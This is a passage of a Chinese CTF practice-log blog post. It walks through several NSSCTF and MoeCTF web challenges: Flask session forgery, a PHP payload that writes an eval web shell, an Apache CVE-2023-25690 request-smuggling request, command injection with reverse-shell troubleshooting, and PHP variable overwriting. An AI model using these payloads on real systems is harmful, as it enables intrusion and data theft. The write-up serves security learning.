<!DOCTYPE html><html lang="zn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>刷题记录 | AsaL1n's blog</title><meta name="author" content="AsaL1n"><meta name="copyright" content="AsaL1n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="刷题记录（持续更新）1.[NSSRound#13 Basic]flask?jwt?flask的伪造，主要还是flask_session_cookies_master的使用 注册账号 1AsaL1n&#x2F;666  访问得到session 使用工具解码 12345flask_session_cookie_manager3.py decode -c &amp;#x27;.eJwlzjsOwjAMANC7ZGawHc">
<meta property="og:type" content="article">
<meta property="og:title" content="刷题记录">
<meta property="og:url" content="https://asal1n.github.io/2023/10/17/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="AsaL1n&#39;s blog">
<meta property="og:description" content="刷题记录（持续更新）1.[NSSRound#13 Basic]flask?jwt?flask的伪造，主要还是flask_session_cookies_master的使用 注册账号 1AsaL1n&#x2F;666  访问得到session 使用工具解码 12345flask_session_cookie_manager3.py decode -c &amp;#x27;.eJwlzjsOwjAMANC7ZGawHc">
<meta property="og:locale">
<meta property="og:image" content="https://asal1n.github.io/img/head.jpg">
<meta property="article:published_time" content="2023-10-16T16:00:00.000Z">
<meta property="article:modified_time" content="2023-10-31T08:03:37.306Z">
<meta property="article:author" content="AsaL1n">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://asal1n.github.io/img/head.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://asal1n.github.io/2023/10/17/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '刷题记录',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-10-31 16:03:37'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

document.addEventListener('pjax:send', () => {
  Pace.restart()
})
</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页/Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线/Footprints</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 朋友们/Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.svg')"><nav id="nav"><span id="blog-info"><a href="/" title="AsaL1n's blog"><span class="site-name">AsaL1n's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页/Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线/Footprints</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 朋友们/Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">刷题记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-10-16T16:00:00.000Z" title="Created 2023-10-17 00:00:00">2023-10-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-10-31T08:03:37.306Z" title="Updated 2023-10-31 16:03:37">2023-10-31</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="刷题记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="刷题记录（持续更新）"><a href="#刷题记录（持续更新）" class="headerlink" title="刷题记录（持续更新）"></a>刷题记录（持续更新）</h1><h2 id="1-NSSRound-13-Basic-flask-jwt"><a href="#1-NSSRound-13-Basic-flask-jwt" class="headerlink" title="1.[NSSRound#13 Basic]flask?jwt?"></a>1.[NSSRound#13 Basic]flask?jwt?</h2><p>flask的伪造，主要还是flask_session_cookies_master的使用</p>
<p>注册账号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AsaL1n/666</span><br></pre></td></tr></table></figure>

<p>访问得到session</p>
<p>使用工具解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flask_session_cookie_manager3.py decode -c &#x27;.eJwlzjsOwjAMANC7ZGawHcd1ehnk-CNYWzoh7g4S7wTv3e515Plo--u48tbuz2h7c8bQLsYmxFQTaaiDWWBMh6224m3mAO28Yo5VACgQnWZorglk4cku5pwusSoi3SE7CnWLQlYiimVYJFs3LcYxpmqJa1q1X-Q68_hvqH2-8QYwUQ.ZJbLpQ.mQofkly52NaaUabvgE5e7vPVSL0&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b&#x27;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&quot;c41d836a4a6242f91258c0aad1d9c07f7f479e50834bd95bf00160d329d8eb902adce4c6ac4ec6dbfddecc0e31623adf148222dba1f2673a8f4155988f6c8eaf&quot;,&quot;_user_id&quot;:&quot;2&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>加密，密钥在修改密码的地方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flask_session_cookie_manager3.py encode -s &#x27;th3f1askisfunny&#x27; -t &quot;&#123;&#x27;_fresh&#x27;:&#x27;true&#x27;,&#x27;_id&#x27;:&#x27;c41d836a4a6242f91258c0aad1d9c07f7f479e50834bd95bf00160d329d8eb902adce4c6ac4ec6dbfddecc0e31623adf148222dba1f2673a8f4155988f6c8eaf&#x27;,&#x27;_user_id&#x27;:&#x27;1&#x27;&#125;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.eJwlzjsOwjAMANC7ZGawHcd1uAxy_BGsLZ0QdwfE-Lb3arfa87i3a3vuZ7ZLuz3iC2cM7WJsQkw1kYY6mAXGdNhqK95mDtDOK-ZYBYAC0WmG5ppAFp7sYs7pEqsi0h2yo1C3KGQloliGRbJ102IcY6qWuKbVL3Ieuf832N4fI0YwlA.ZJbNxg.mlyXN99cSeWkcV431shr1JM4uOU</span><br></pre></td></tr></table></figure>

<p>问题：</p>
<h3 id="flask的使用和报错解决（席八）"><a href="#flask的使用和报错解决（席八）" class="headerlink" title="flask的使用和报错解决（席八）"></a>flask的使用和报错解决（席八）</h3><p>1.执行指令集合:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">usage: flask_session_cookie_manager&#123;2,3&#125;.py encode [-h] -s &lt;string&gt; -t &lt;string&gt;</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -s &lt;string&gt;, --secret-key &lt;string&gt;</span><br><span class="line">                        Secret key</span><br><span class="line">  -t &lt;string&gt;, --cookie-structure &lt;string&gt;</span><br><span class="line">                        Session cookie structure、</span><br><span class="line">                        </span><br><span class="line">                        </span><br><span class="line">                        </span><br><span class="line"> usage: flask_session_cookie_manager&#123;2,3&#125;.py decode [-h] [-s &lt;string&gt;] -c &lt;string&gt;</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -s &lt;string&gt;, --secret-key &lt;string&gt;</span><br><span class="line">                        Secret key</span><br><span class="line">  -c &lt;string&gt;, --cookie-value &lt;string&gt;</span><br><span class="line">                        Session cookie value</span><br></pre></td></tr></table></figure>

<p>使用中出现的问题</p>
<p>1.弹出</p>
<p>quote&gt;</p>
<p>冒号没有闭合的问题，闭合就好了</p>
<p>2.输入的加密的时候的-s选项，就算没有密钥也必须要加上</p>
<p>3.错误“usage: flask_session_cookie_manager3.py [-h] {encode,decode} …”</p>
<p>这里的处理方式是-s和-t都需要添加“”作为参数包裹</p>
<p>4.错误“Encoding error] malformed node or string on line 1: &lt;ast.Name object at 0x7f755d8a04c0”</p>
<p>额是-t参数里面单双引号的问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;&#x27;_fresh&#x27;:&#x27;true&#x27;,&#x27;_id&#x27;:&#x27;c41d836a4a6242f91258c0aad1d9c07f7f479e50834bd95bf00160d329d8eb902adce4c6ac4ec6dbfddecc0e31623adf148222dba1f2673a8f4155988f6c8eaf&#x27;,&#x27;_user_id&#x27;:&#x27;2&#x27;&#125;&quot;</span><br><span class="line">(正确)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#123;&quot;_fresh&quot;:&#x27;true&#x27;,&quot;_id&quot;:&quot;c41d836a4a6242f91258c0aad1d9c07f7f479e50834bd95bf00160d329d8eb902adce4c6ac4ec6dbfddecc0e31623adf148222dba1f2673a8f4155988f6c8eaf&quot;,&quot;_user_id&quot;:&quot;2&quot;&#125;&#x27;</span><br><span class="line">（报错）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="2-NSSRound-13-Basic-信息收集"><a href="#2-NSSRound-13-Basic-信息收集" class="headerlink" title="2.[NSSRound#13 Basic]信息收集"></a>2.[NSSRound#13 Basic]信息收集</h2><p>(好玩好玩好玩好玩)</p>
<p>开始用dirsearch去扫描</p>
<p>扫出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php/login</span><br><span class="line">/cgi-bin/testcgi</span><br><span class="line">/cgi/bin/printenv</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>

<p>index存在文件包含</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>读文件可以读出index.php和&#x2F;etc&#x2F;passwd</p>
<p>尝试写文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line">POST发包</span><br><span class="line"><span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>好像不能生成shell.php的文件，可能是没有写文件权限（或者是奇奇怪怪的问题）</p>
<p>到这里就卡住了</p>
<p>nikto扫一扫，有个trace的OVB</p>
<p>抓包得到apache2.455的版本，查查有没有成型的cve</p>
<p>还真有，靠</p>
<h3 id="CVE-2023-25690-Apache-HTTP-Server-请求走私漏洞"><a href="#CVE-2023-25690-Apache-HTTP-Server-请求走私漏洞" class="headerlink" title="CVE-2023-25690 Apache HTTP Server 请求走私漏洞"></a>CVE-2023-25690 Apache HTTP Server 请求走私漏洞</h3><p>参考这篇文章</p>
<p><a target="_blank" rel="noopener" href="http://www.hackdig.com/03/hack-949961.htm">CVE-2023-25690 Apache HTTP Server 请求走私漏洞 分析与利用_黑客技术 (hackdig.com)</a></p>
<p>读取Apache配置文件</p>
<p>RewriteRule “^&#x2F;nssctf&#x2F;(.*)” “<a target="_blank" rel="noopener" href="http://backend-server:8080/index.php?id=$1">http://backend-server:8080/index.php?id=$1</a>“ [P] ProxyPassReverse “&#x2F;nssctf&#x2F;“ “<a target="_blank" rel="noopener" href="http://backend-server:8080/">http://backend-server:8080/</a>“</p>
<p>制造一个走私包</p>
<h3 id="http走私"><a href="#http走私" class="headerlink" title="http走私"></a>http走私</h3><p>前端服务器负责安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，并对每一个请求都进行响应。在这种情况下可以利用HTTP请求走私，将无法访问的请求走私给后端服务器以获得响应。</p>
<p>前后端对web请求的分析方式不同，可能存在两个不同的分析方式，在对http请求的过程中存在问题</p>
<p>详情看<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/243652.html">详细笔记+实验：HTTP请求走私 - FreeBuf网络安全行业门户</a></p>
<p>这里尝试访问一个不存在的&#x2F;abc端口，走私一个访问flag.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /nssctf/abc%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/flag.txt HTTP/1.1</span><br><span class="line"></span><br><span class="line">前半是一个404，后半走私了一个http请求，成功得到flag</span><br></pre></td></tr></table></figure>

<h2 id="3-NSSRound-13-Basic-ez-factors"><a href="#3-NSSRound-13-Basic-ez-factors" class="headerlink" title="3.[NSSRound#13 Basic]ez_factors"></a>3.[NSSRound#13 Basic]ez_factors</h2><p>&#x2F;factors&#x2F;后面的字符被作为分解质因数数据</p>
<p>可以进行命令执行</p>
<p>尝试1|env，得到奇怪的数字</p>
<p>过滤了回显端口，只会回显数字和；</p>
<p>蛮简单的一道题目，出了好多问题</p>
<h3 id="对路由的破坏和绕过"><a href="#对路由的破坏和绕过" class="headerlink" title="&#x2F;对路由的破坏和绕过"></a>&#x2F;对路由的破坏和绕过</h3><p>题目告诉我flag在&#x2F;flag上面，当我使用尝试cat &#x2F;flag的时候，会破坏浏览器路由，无法直接传值给后端，解决方法是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..;cd ..;cd ..;cd ..;cd ..;cat flag</span><br></pre></td></tr></table></figure>

<p>反弹shell的时候&#x2F;也会破坏路由，可以base64绕过</p>
<p>xxxxxxxx|base64 -d</p>
<h3 id="反弹shell小小总结"><a href="#反弹shell小小总结" class="headerlink" title="反弹shell小小总结"></a>反弹shell小小总结</h3><p>这题想要反弹shell，怎么弹都不不行，md自己kali也弹不到vps上面，牛魔的</p>
<p>1.常见反弹shell方式</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1818091">反弹Shell，看这一篇就够了-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p>很全了，懒得总结</p>
<p>2.反弹不成功的问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">错误1.bash: /dec/tcp/47.120.0.245/2333: 没有那个文件或目录</span><br></pre></td></tr></table></figure>

<p>使用kali检验自己的vps是不是坏了的时候发现的</p>
<p>kali用的是ubuntu,而ubuntu默认是没开bash的网络重定向选项，也就是–enable-net-redirections选项，只要把这个选项加上就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&gt; /dev/null</span><br><span class="line">apt-get -y install gcc make &amp;&gt; /dev/null</span><br><span class="line">./configure --enable-net-redirections</span><br></pre></td></tr></table></figure>

<p>执行开启就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">错误2.crul尝试3232端口，没有监听到东西</span><br></pre></td></tr></table></figure>

<p>防火墙没开，当然curl没反应</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ufw status(乌班图)//查看防火墙状态</span><br><span class="line">ufw allow 3232//开放3232端口</span><br></pre></td></tr></table></figure>

<p>这题使用od解答</p>
<p>od -t d1 flag得到8进制，解码就好了</p>
<h3 id="od用法"><a href="#od用法" class="headerlink" title="od用法"></a>od用法</h3><p>od 命令用于将指定文件内容以八进制、十进制、十六进制、浮点格式或 ASCII 编码字符方式显示，通常用于显示或查看文件中不能直接显示在终端的字符。od 命令系统默认的显示方式是八进制</p>
<p>[(7条消息) Linux od 命令详细介绍及用法实例_od命令用法_Reverse-xiaoyu的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40085614/article/details/119532314#:~:text=Linux">https://blog.csdn.net/qq_40085614/article/details/119532314#:~:text=Linux</a> od 命令详细介绍及用法实例 1 1.功能 od 命令用于将指定文件内容以八进制、十进制、十六进制、浮点格式或 ASCII,for file offsets. … 4 4.用法示例 （1）设置第一列偏移地址以十进制显示。 )</p>
<h2 id="4-MoeCTF-2022-ezphp"><a href="#4-MoeCTF-2022-ezphp" class="headerlink" title="4.[MoeCTF 2022]ezphp"></a>4.[MoeCTF 2022]ezphp</h2><p>短小但是很有益</p>
<p>上来给了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$giveme</span> = <span class="string">&#x27;can can need flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$getout</span> = <span class="string">&#x27;No! flag.Try again. Come on!&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$giveme</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这题一步一步执行下来，会直接给出flag</p>
<p>首先如果没有post和get就会直接exit弹出</p>
<p>如果post或者get一个值等于flag的就会exit</p>
<p>重点在后面的foreach函数里面</p>
<h3 id="foreach函数-foreach-VAR-LIST-TEXT"><a href="#foreach函数-foreach-VAR-LIST-TEXT" class="headerlink" title="foreach函数               $(foreach VAR,LIST,TEXT)"></a>foreach函数               $(foreach VAR,LIST,TEXT)</h3><p>函数功能：这个函数的工作过程是这样的：如果需要（存在变量或者函数的引用），首先展开变量“VAR”和“LIST”的引用；而表达式“TEXT”中的变量引用不展开。执行时把“LIST”中使用空格分割的单词依次取出赋值给变量“VAR”，然后执行“TEXT”表达式。重复直到“LIST”的最后一个单词（为空时结束）。“TEXT”中的变量或者函数引用在执行时才被展开，因此如果在“TEXT”中存在对“VAR”的引用，那么“VAR”的值在每一次展开式将会到的不同的值。</p>
<p>这里调用了$_GET和 $_POST 两个超级全局变量，就是对我们传入的值转换为键值对储存</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">传入a=flag</span><br><span class="line">会转换为&#123;$key=a:$value:flag&#125;两个键值对</span><br></pre></td></tr></table></figure>

<p>后面定义了一个$$key变量等于$value</p>
<p>就是转换为$a&#x3D;flag。</p>
<p>如果按照要求，传入一个flag值，这个值的大小会吧原来的$flag覆盖掉，导致没有flag</p>
<p>注意到$$key &#x3D; $$value;</p>
<p>这里可以使用变量覆盖</p>
<p>使用一个$b先把flag的值储存下来，然后再重新赋值给flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行即$$b=$flag;$flag=$b</span><br></pre></td></tr></table></figure>

<p>传入a&#x3D;flag&amp;flag&#x3D;a</p>
<p>变量覆盖，好玩</p>
<h2 id="5-NSSCTFRound-7-O0O"><a href="#5-NSSCTFRound-7-O0O" class="headerlink" title="5.NSSCTFRound#7 O0O"></a>5.NSSCTFRound#7 O0O</h2><p>昏过去啦，但是学了很多</p>
<p>打开靶机，nothing here</p>
<p>常规的dirsearch扫描，扫描出一个.DS_Store的文件</p>
<h3 id="DS-Store泄露"><a href="#DS-Store泄露" class="headerlink" title=".DS_Store泄露"></a>.DS_Store泄露</h3><p>.DS_Store是Mac OS保存文件夹的自定义属性的隐藏文件，如文件的图标位置或背景色，相当于Windows的desktop.ini。</p>
<p>使用工具 <a target="_blank" rel="noopener" href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p>
<p>python ds_store_exp.py url&#x2F;.DS_Store</p>
<p>下载了index.php和NsScTf.php文件</p>
<p>以下是源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td 